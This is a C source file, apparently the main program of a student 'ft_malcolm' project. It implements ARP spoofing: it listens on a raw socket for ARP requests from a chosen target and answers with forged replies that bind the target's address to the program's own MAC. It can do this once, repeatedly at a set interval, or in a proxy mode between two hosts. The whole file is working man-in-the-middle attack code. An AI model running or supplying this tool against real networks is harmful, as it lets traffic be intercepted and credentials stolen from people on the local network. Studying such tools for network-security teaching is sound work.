#include "../headers/malcolm.h"
#include "../headers/options.h"

t_data	g_data;

int send_back(struct sockaddr_ll src_addr, struct ethernet_hdr *ethernet,
	struct arp_hdr *arp)
{
	int ret;
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};

	uint8_t tmp_ip[IP_ADDR_LEN] = {0};

	/* Fill the new packet */
	packet.ethernet = *ethernet;
	packet.arp = *arp;
	/* Set the ARP opcode to reply */
	packet.arp.op = ft_htons(ARP_REPLY);

	/* Changing MAC addresses */
	ft_memcpy(packet.ethernet.dmac, packet.ethernet.smac, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, g_data.source_mac, ETH_ADDR_LEN);
	ft_memcpy(packet.arp.tha, packet.arp.sha, ETH_ADDR_LEN);
	ft_memcpy(packet.arp.sha, g_data.source_mac, ETH_ADDR_LEN);

	/* Swapping IP addresses */
	ft_memcpy(tmp_ip, packet.arp.sip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.sip, packet.arp.tip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.tip, tmp_ip, IP_ADDR_LEN);

	/* debug_packet(&packet.ethernet, &packet.arp); */

	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&src_addr, addr_len);

	if (ret == -1) {
		fprintf(stderr, "[!] Failed to send arp reply to ");
		print_ip(STDERR_FILENO, packet.arp.tip);
		fprintf(stderr, "\n");
		return -1;
	}

	return 0;
}

int filter_out(uint8_t *ip)
{
	int i = 0;
	while (i < IP_ADDR_LEN) {
		if (g_data.target_ip[i] != ip[i])
			return 1;
		i++;
	}

	return 0;
}

int handle_packet(struct sockaddr_ll src_addr, char *buffer)
{
	struct arp_hdr *arp;
	struct ethernet_hdr *ethernet;
	uint16_t type;
	uint16_t opcode;
	struct timespec wait = {g_data.frequency, 0};

	ethernet = (struct ethernet_hdr *)buffer;
	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));

	type = ft_ntohs(ethernet->type);
	/* TODO: Check if an OPCODE check is needed */
	opcode = ft_ntohs(arp->op);

	if (type == ETH_P_ARP && opcode == ARP_REQUEST &&
		!filter_out(arp->sip)) {
		debug_packet(ethernet, arp);
		if (g_data.duration) {
			printf("Spoofing the target for %d seconds\n", g_data.duration);
			alarm(g_data.duration);
		}

		/* Saving original mac of the target */
		ft_memcpy(g_data.original_mac, ethernet->smac, ETH_ADDR_LEN);
		dprintf(STDOUT_FILENO, "Original mac: ");
		print_mac(g_data.original_mac);
		printf("\n");

		uint8_t wait_loop_len = 4;
		char *wait_loop = "/-\\-";
		int i = 0;

		while (g_data.loop) {
			if (send_back(src_addr, ethernet, arp) != 0)
				break;
			if (!(g_data.opt & OPT_PERSISTENT) && !(g_data.opt & OPT_PROXY)) {
				printf("Spoofed, exiting\n");
				break;
			}
			ft_putchar('\r');
			printf("Spoofing ");
			fflush(stdout);
			ft_putchar(wait_loop[i % wait_loop_len]);
			i++;
			clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
		}
		return 1;
	}
	else {
		dprintf(STDOUT_FILENO, "Filtering request from ");
		print_ip(STDOUT_FILENO, arp->sip);
		dprintf(STDOUT_FILENO, "\n");
	}

	return 0;
}

int ft_malcolm(void)
{
	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
	char buffer[len];
	int ret;
	struct sockaddr_ll src_addr;
	socklen_t addr_len = sizeof(struct sockaddr_ll);

	/* Socket creation */
	if ((g_data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		fprintf(stderr, "[!] Failed to create socket\n");
		return 1;
	}

	/* Initializing signal handler */
	signal(SIGINT, inthandler);
	signal(SIGALRM, inthandler);

	if (g_data.opt & OPT_PROXY) {
		dprintf(STDOUT_FILENO, "Proxying between ");
		print_ip(STDOUT_FILENO, g_data.source_ip);
		dprintf(STDOUT_FILENO, " and ");
		print_ip(STDOUT_FILENO, g_data.target_ip);
		dprintf(STDOUT_FILENO, "\n");
		ft_proxy(g_data.source_ip, g_data.target_ip);
		return 0;
	}
	printf("Sniffing ARP packets, press CTRL+C to exit...\n");
	while (g_data.loop) {
		ret = recvfrom(g_data.sockfd, buffer, len, MSG_DONTWAIT,
			(struct sockaddr *)&src_addr, &addr_len);
		if (ret > 0 && handle_packet(src_addr, buffer))
			break ;
	}

	close(g_data.sockfd);
	return 0;
}

/* TODO: Check allowed functions and fd leaks */
int main(int ac, char **av)
{
	/* g_data default values */
	ft_bzero(&g_data, sizeof(g_data));
	g_data.frequency = 2; /* 2 Seconds */
	g_data.loop = 1; /* The loop is started by default */

	if (parse_option_line(ac, av))
		return -1;

	/* TODO: Must handle error cases for arguments (emptys, etc...) */
	/* TODO: Check permissions (must be sudo), help/version must be displayed if not sudo */
	ft_malcolm();
	return 0;
}
